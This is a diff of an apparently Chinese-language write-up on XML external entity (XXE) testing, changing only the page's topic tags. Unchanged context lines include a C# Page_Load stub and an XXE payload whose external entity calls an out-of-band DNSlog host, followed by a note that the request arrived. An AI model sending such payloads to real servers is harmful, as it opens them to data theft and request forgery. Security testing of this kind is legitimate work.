@@ -24,11 +24,11 @@ asset_dir: embedded-base64
 
 深入探索
 
-blog
+数据格式与协议
 
-互联网与电信
+网络
 
-计算机安全
+计算机服务器
 
 ```
 protected void Page_Load(object sender, EventArgs e)
@@ -53,6 +53,14 @@ Content-Type: application/xml
 <!ENTITY % remote SYSTEM "http://xxe.vk8uek6g.dnslog.pt/xxe_test">
 %remote;]>
 ```
+
+深入探索
+
+字典与百科全书
+
+脚本语言
+
+互联网服务提供商
 
 在DNSLOG平台成功收到请求
 
